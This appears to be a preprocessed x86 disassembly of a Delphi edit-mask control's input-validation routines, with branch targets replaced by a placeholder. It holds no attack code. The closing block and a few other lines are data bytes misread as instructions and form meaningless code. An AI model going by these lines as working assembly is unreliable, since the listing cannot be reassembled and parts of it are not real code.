dec [ ebx + 0x230 ]
cmp si 0x25
jne r-xdata
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov ecx eax
mov edx eax
mov eax ebx
call sub_471f94
dec [ ebx + 0x230 ]
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47265c
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47265c
jmp r-xdata
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47265c
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_472694
jmp r-xdata
sub_47265c
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea ebx [ ecx + edi ]
mov edx ebx
mov eax esi
call sub_4726b0
mov ebx eax
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_47091c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_471fb8
pop edi
pop esi
pop ebx
retn
mov ebx edi
sub_4726b0
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
cmp ebx [ esi + 0x228 ]
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_47091c
test al al
jne r-xdata
inc ebx
sub_4726d8
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_47091c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4726b0
mov ebx eax
dec ebx
sub_47270c
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov ebx eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_471f70
cmp si 0x24
jne r-xdata
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x1
je r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_471fb8
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_471fb8
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
mov ecx [ ebx + 0x228 ]
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_471f94
mov eax ebx
call sub_472228
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp + 0x8 ]
xor edx edx
mov eax ebx
call sub_471f94
mov eax ebx
call sub_472228
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x230 ] eax
mov eax [ esp + 0x8 ]
dec eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
mov [ esp + 0x8 ] eax
sub_4727dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push j_sub_403924#9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4728ef
lea eax [ ebp - 0xc ]
call sub_403f20
retn
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_471f70
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jl r-xdata
cmp si 0x8
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_471ad0
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
push eax
lea edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax ebx
call sub_473294
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx [ edi ]
mov edx [ edi ]
inc edx
mov eax [ ebp - 0xc ]
call sub_404440
mov eax [ ebp - 0xc ]
call sub_4043e0
push eax
push 0x0
push 0xc2
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
je r-xdata
mov esi [ edi ]
mov edx [ edi ]
mov eax ebx
call sub_472694
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_471f70
cmp esi [ edi ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_471f70
mov edx [ edi ]
dec edx
mov eax ebx
call sub_471fb8
mov edx [ edi ]
mov eax ebx
call sub_4726b0
mov [ edi ] eax
mov edx [ edi ]
mov eax ebx
call sub_471fb8
jmp r-xdata
sub_4728f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47297b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_471d98
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4422dc
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x22d ] 0x2
jne r-xdata
and [ ebx + 0x22d ] 0xfd
mov eax ebx
call sub_472228
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_471ad0
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x238 ]
call sub_403f74
mov edx esi
mov eax ebx
call sub_4422dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472982
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_472988
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push j_sub_403924#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_442318
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_471ad0
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x238 ]
call sub_403f74
mov eax ebx
call sub_453d8c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472a10
lea eax [ ebp - 0xc ]
call sub_403f20
retn
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_471f70
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4726b0
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx eax
mov eax ebx
call sub_471fb8
sub_472a18
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x4 ] 0x1b
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_471d98
test al al
je r-xdata
mov eax ebx
call sub_441b5c
test al al
je r-xdata
mov [ esi + 0xc ] 0x1
sub_472a50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_471d98
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_452eb0
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov eax ebx
call sub_472228
sub_472a84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_472b16
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_471ad0
mov eax esi
call sub_471d98
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472b1d
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax esi
call sub_441b5c
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
test al al
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_471fb8
mov eax esi
mov edx [ eax ]
call [ edx + 0xf4 ]
or [ esi + 0x22d ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_472b24
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x0
call MessageBeep
mov eax [ ebx + 0x220 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
pop ecx
pop edx
pop ebx
retn
sub_472b60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov cl [ ebx + 0x224 ]
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_4704d4
push edi
mov cl 0x20
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_4704d4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_472ba8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403924#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax esi
mov edx ebx
call sub_403f74
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_4041e0
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx 0x1
call sub_470438
mov ebx eax
test bl 0x1
je r-xdata
mov edi 0x1
mov eax [ esi ]
call sub_4041e0
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ esi ]
call sub_4041e0
mov ebx eax
test ebx ebx
jle r-xdata
mov al [ ebp - 0xd ]
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi ]
call sub_4041e0
mov ecx eax
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
inc edx
mov eax [ esi ]
call sub_404440
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov eax [ esi ]
mov edx 0x1
call sub_404440
mov edx [ ebp - 0x18 ]
mov eax esi
pop ecx
call sub_40422c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x20
je r-xdata
mov edi 0x1
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edi 0x1
inc edi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472d75
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f44
retn
mov eax [ esi ]
call sub_4041e0
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ esi ]
call sub_4041e0
mov edx eax
dec edx
mov eax esi
call sub_40456c
inc edi
dec ebx
jne r-xdata
push esi
mov eax [ esi ]
call sub_4041e0
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ esi ]
mov edx [ ebp - 0xc ]
call sub_404440
jmp r-xdata
inc [ ebp - 0xc ]
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx edi
call sub_4702e4
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
dec eax
sub al 0x2
jae r-xdata
mov edi 0x1
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ esi ]
mov al [ edx + eax ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov eax esi
call j_sub_4043ec
mov [ eax + edi - 0x1 ] 0x20
inc edi
dec ebx
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
sub_472d7c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov bl 0x1
cmp [ esi + 0x220 ] 0x0
je r-xdata
test bl bl
jne r-xdata
xor ebx ebx
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4708c0
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call MessageBeep
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4702e4
mov [ esp ] al
mov al [ ebp ]
mov [ esp + 0x1 ] al
mov edx ebp
mov ecx edi
mov eax esi
call sub_472f10
mov ebx eax
test bl bl
jne r-xdata
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
mov cl [ esp + 0x1 ]
mov edx edi
mov eax esi
call sub_4735f0
mov edi eax
test edi edi
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_47086c
mov edi eax
mov edx edi
mov eax esi
call sub_471fb8
jmp r-xdata
sub_472e30
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_472efe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_47086c
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_4041e0
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jle r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax - 0x1 ]
call sub_402918
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax ]
call sub_402918
pop edx
cmp dl al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_471ad0
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40c218
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_471ad0
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x1 ]
call sub_40c218
cmp al 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472f05
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
sub_472f10
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403924#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_4702e4
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_470438
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x43
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
call sub_4704b4
mov [ ebx ] al
jmp r-xdata
sub eax 0x4c
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4731c9
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_403f44
retn
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x15
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x23
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_403fb8
lea eax [ ebp - 0x10 ]
call j_sub_4043ec
mov dl [ ebx ]
mov [ eax ] dl
mov al [ ebx ]
call sub_472e18
test al al
je r-xdata
push ebp
mov al [ ebx ]
call sub_472e30
pop ecx
test al al
je r-xdata
sub eax 0x2
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
je r-xdata
push ebp
mov al [ ebx ]
call sub_472e30
pop ecx
test al al
je r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0xd
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_403fb8
lea eax [ ebp - 0x10 ]
call j_sub_4043ec
mov dl [ ebx ]
mov [ eax ] dl
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x20
je r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0x9
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x41
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_407e44
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_403fb8
jmp r-xdata
cmp [ ebx ] 0x2b
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
sub eax 0x8
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_407e44
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_403fb8
jmp r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaNumericA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x61
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_407e78
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_403fb8
cmp [ ebx ] 0x2d
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_407e78
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_403fb8
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_4731d7
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] 0x1
mov eax [ ebp + 0x220 ]
call sub_4041e0
mov esi eax
test esi esi
jle r-xdata
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc edi
dec esi
jne r-xdata
cmp bl 0x4
jne r-xdata
mov eax [ ebp + 0x220 ]
mov edx edi
call sub_4702e4
mov ebx eax
mov eax ebx
dec eax
sub al 0x2
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp + 0x224 ]
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0xc ]
dec eax
mov edx [ esp + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
inc [ esp + 0xc ]
mov eax [ ebp + 0x220 ]
cmp [ eax + edi - 0x1 ] 0x43
je r-xdata
sub_473294
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
inc ebx
add eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_4708c0
mov esi eax
test esi esi
jl r-xdata
mov eax [ edi + 0x220 ]
call sub_4041e0
sub eax esi
jl r-xdata
inc eax
xchg esi eax
mov [ ebp - 0x14 ] eax
add al 0xfc
sub al 0x2
jae r-xdata
inc ebx
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call j_sub_4043ec
mov dl [ edi + 0x224 ]
mov [ eax + ebx - 0x1 ] dl
inc ebx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x14 ]
call sub_4702e4
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
sub_47332c
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push j_sub_403924#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4735e3
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_403f44
lea eax [ ebp - 0x10 ]
call sub_403f20
retn
mov ebx 0x1
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_403fb8
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x220 ]
call sub_4708c0
mov edi eax
test edi edi
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_4041e0
cmp edi eax
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4702e4
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
call sub_4041e0
add eax [ ebp + 0x8 ]
cmp eax [ esi + 0x228 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov ecx edi
mov eax esi
call sub_472f10
test al al
jne r-xdata
dec eax
sub al 0x2
jae r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_40c218
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4041e0
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40c218
cmp al 0x2
jne r-xdata
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax ebx
cmp eax [ esi + 0x228 ]
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x228 ]
sub ecx edi
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404440
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404440
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_40422c
inc edi
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404440
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4041e0
add eax [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx eax
push edx
mov eax [ ebp - 0x10 ]
call sub_4041e0
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
pop ecx
call sub_404440
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042a0
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov dl [ esi + 0x224 ]
call sub_404108
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_4041e8
inc ebx
lea eax [ ebp - 0x10 ]
call j_sub_4043ec
mov dl [ ebp - 0x11 ]
mov [ eax + ebx - 0x1 ] dl
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov al [ esi + 0x224 ]
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x10 ]
call j_sub_4043ec
mov dl [ esi + 0x224 ]
mov [ eax + ebx ] dl
mov eax [ ebp - 0x10 ]
call sub_4041e0
cmp eax ebx
jl r-xdata
add ebx [ ebp + 0x8 ]
dec ebx
mov [ ebp - 0x8 ] ebx
inc ebx
inc ebx
inc edi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404440
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0x11 ]
call sub_404108
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4041e0
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_404440
push [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4042a0
inc edi
sub_4735f0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
or ebp 0xffffffff
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_4041e0
cmp edi eax
jl r-xdata
inc edi
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4702e4
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x220 ]
mov dl [ edx + edi - 0x1 ]
cmp al 0x2
jne r-xdata
cmp bl dl
jne r-xdata
mov eax edx
call sub_4704b4
mov edx eax
mov ebp edi
jmp r-xdata
sub_47364c
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403924#4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473678
retn
sub_473684
shl [ esi ] 0x1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
aaa
inc edi
add [ edx ] bl
cmp [ edi ] al
pushfd
add al [ eax ]
add [ eax ] dl
or al [ eax + eax - 0x3c ]
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
rol [ edx + 0x47 ] 0x0
mov al [ 0xffffffffc8004545 ]
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + 0x42 ] dh
inc edi
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
